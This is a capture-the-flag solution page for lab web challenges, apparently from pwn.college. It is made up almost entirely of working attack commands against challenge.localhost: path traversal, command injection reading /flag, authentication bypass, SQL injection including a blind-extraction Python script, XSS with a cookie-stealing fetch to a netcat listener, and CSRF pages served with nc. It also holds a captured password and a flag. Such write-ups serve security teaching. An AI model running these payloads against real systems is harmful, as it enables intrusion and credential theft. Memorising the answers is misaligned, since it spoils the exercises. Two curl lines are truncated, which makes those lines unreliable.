# Web Security

Solutions to web security challenges using the commandline

## Path Traversal 1

```bash
curl --path-as-is "http://challenge.localhost/package/../../flag"
```

## Path Traversal 2

```bash
curl --path-as-is "http://challenge.localhost/deliverables/fortunes/../../../flag"
```


## CMDi 1

```bash
curl "http://challenge.localhost/checkpoint?root=%26cat%20/flag"
```


## CMDi 2

```bash
curl "http://challenge.localhost/checkpoint?folder=%26cat%20/flag"
```


## CMDi 3

```bash
curl "http://challenge.localhost/quest?path=/'%26cat%20'/flag"
```


## CMDi 4

```bash
curl "http://challenge.localhost/event?time-zon=MST%20date%26cat%20/flag%26"
```


## CMDi 5

```bash
curl "http://challenge.localhost/mission?full-path=%26cat%20/flag>flag"
```


## CMDi 6

Use newline char to run as two separate commands: **`%0a`**

```bash
curl "http://challenge.localhost/adventure?directory-path=%0acat%20/flag"
```


## Authentication Bypass 1

```bash
curl "http://challenge.localhost/?session_user=admin"
```


## Authentication Bypass 2

```bash
curl -b "session_user=admin" "http://challenge.localhost/"
```


## SQLi 1

```bash
curl -c cookies.txt -X POST http://challenge.localhost/authentication -d "user-handle=admin&pin=1 OR 1=1"
curl -b cookies.txt http://challenge.localhost/authentication
```


## SQLi 2

Escape and inject:

```bash
curl -c cookies.txt -X POST http://challenge.localhost/logon -d "userid=admin&account-password=1' OR '1'='1"
curl -b cookies.txt http://challenge.localhost/logon
```


## SQLi 3

Use **`UNION`**:

```bash
curl "http://challenge.localhost/?query=%22%20OR%201%3D1%20UNION%20SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27%20--"
```


## SQLi 4

Read master list of table names, then get dig into that table:

" UNION SELECT name FROM sqlite_master WHERE type='table' --

```bash
curl "http://challenge.localhost/?query=%22%20OR%201%3D1%20UNION%20SELECT%20name%20FROM%20sqlite_master%20WHERE%20type%3D%27table%2
curl "http://challenge.localhost/?query=%22%20OR%201%3D1%20UNION%20SELECT%20password%20FROM%20users_6569529725%20WHERE%20username%3
D%27admin%27%20--"
```


## SQLi 4

Brute force one letter at the time checking half alphabet each request

```py
#!/usr/bin/env python3
import requests
import string

BASE_URL = "http://challenge.localhost/"
USERNAME = "admin"
MAX_PASSWORD_LENGTH = 57  # longer since password may contain symbols

def extract_password():
    printable_chars = [c for c in string.printable if c not in string.whitespace or c == ' ']

    def check_injection(chars, position):
        # Escape single quotes in chars for safety
        escaped_chars = [c.replace("'", "''") for c in chars]
        chars_list = "', '".join(escaped_chars)
        injection = f"' OR (username = '{USERNAME}' AND SUBSTR(password, {position}, 1) IN ('{chars_list}')) -- "
        data = {
            "username": USERNAME,
            "password": injection
        }
        response = requests.post(BASE_URL, data=data)
        return response.status_code == 200

    password = ""

    for pos in range(1, MAX_PASSWORD_LENGTH + 1):
        candidates = printable_chars.copy()

        while len(candidates) > 1:
            mid = len(candidates) // 2
            left = candidates[:mid]
            right = candidates[mid:]

            if check_injection(left, pos):
                candidates = left
            else:
                candidates = right

        char = candidates[0]
        if check_injection([char], pos):
            password += char
            print(f"Found character {pos}: {repr(char)}")
        else:
            print(f"Password found: {password}")
            return password

    print(f"Password found (max length reached): {password}")
    return password

if __name__ == "__main__":
    extract_password()
```


## XSS 1

```bash
curl "http://challenge.localhost" -d "content=<input>"
```

then run the victims script to check to see if he gets our html:

```bash
./victim
```


## XSS 2

```bash
curl "http://challenge.localhost" -d "content=<script>alert(\"PWNED\")</script>"
```

then run the victims script to check to see if he rund our script:

```bash
./victim
```


## XSS 3

```bash
/challenge/victim "http://challenge.localhost?msg=<script>alert(\"PWNED\")</script>"
```


## XSS 4

```bash
/challenge/victim "http://challenge.localhost?msg=</textarea><script>alert(\"PWNED\")</script><textarea>"
```


## XSS 5

Log in as user, password is "password"


```js
<script>fetch("http://challenge.localhost/publish");</script>
```

```bash
curl -c cookies.txt -X POST "http://challenge.localhost:80/login" -d "username=guest&password=password"
curl -b cookies.txt "http://challenge.localhost:80/draft" -d "content=<script>fetch('http://challenge.localhost:80/publish')</script>"
curl -b cookies.txt http://challenge.localhost:80/publish
/challenge/victim
curl -b cookies.txt http://challenge.localhost:80/
```


## XSS 6

Log in as user, password is "password"

```js
<script>fetch('http://challenge.localhost:80/publish',{method: 'POST'})</script>
```

```bash
curl -c cookies.txt -X POST "http://challenge.localhost:80/login" -d "username=guest&password=password"
curl -b cookies.txt "http://challenge.localhost:80/draft" -d "content=<script>fetch('http://challenge.localhost:80/publish',{method: 'POST'})</script>"
curl -b cookies.txt -X POST http://challenge.localhost:80/publish
/challenge/victim
curl -b cookies.txt http://challenge.localhost:80/
```


## XSS 7

Log in as user, password is "password"

```bash
nc -lvnp 5000 &
```
```js
<script>fetch('http://localhost:5000?'+document.cookie)</script>
```

```bash
curl -c cookies.txt -X POST "http://challenge.localhost:80/login" -d "username=guest&password=password"
curl -b cookies.txt "http://challenge.localhost:80/draft" -d "content=<script>fetch('http://localhost:5000?'%2Bdocument.cookie)</script>"
curl -b cookies.txt -X POST http://challenge.localhost:80/publish
/challenge/victim
```

nc catches the admin password, so we can now login as admin to see his drafts.

```bash
curl -c cookies.txt -X POST "http://challenge.localhost:80/login" -d "username=admin&password=YA.dJDO1YDL5ETN1QzW}"
curl -b cookies.txt "http://challenge.localhost:80"
```


## CSRF 1

Setting up a redirect using nc:

```bash
printf 'HTTP/1.1 302 Found\r\nLocation: http://challenge.localhost/publish\r\n\r\n' | nc -l -p 1337
```

When the victim visits our site he is redirected to the /publish and post the flag. We can then log in as guest to view it:

```bash
curl -c cookies.txt -X POST "http://challenge.localhost:80/login" -d "username=guest&password=password"
curl -b cookies.txt "http://challenge.localhost:80"
```


## CSRF 2

Setting up a webpage that sends a POST request using nc:

```bash
printf 'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body><form id="f" action="http://challenge.localhost/publish" method="POST"><input type="hidden" name="foo" value="bar"></form><script>document.getElementById("f").submit();</script></body></html>' | nc -l -p 1337
```

When the victim visits our site he is redirected to the /publish and post the flag. We can then log in as guest to view it:

```bash
curl -c cookies.txt -X POST "http://challenge.localhost:80/login" -d "username=guest&password=password"
curl -b cookies.txt "http://challenge.localhost:80"
```


## CSRF 3

Setting up a webpage that sends a POST request using nc:

```bash
printf "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body><form id=\"f\" action=\"http://challenge.localhost/ephemeral\"><input type=\"hidden\" name=\"msg\" value=\"<script>alert('PWNED');</script>\"></form><script>document.getElementById('f').submit();</script></body></html>" | nc -l -p 1337
```

When the victim visits our site he is redirected to the /publish and post the flag. We can then log in as guest to view it:

pwn.college{c3jwePPn29_JUALBWRDvbLuZaK_.dNDO1YDL5ETN1QzW}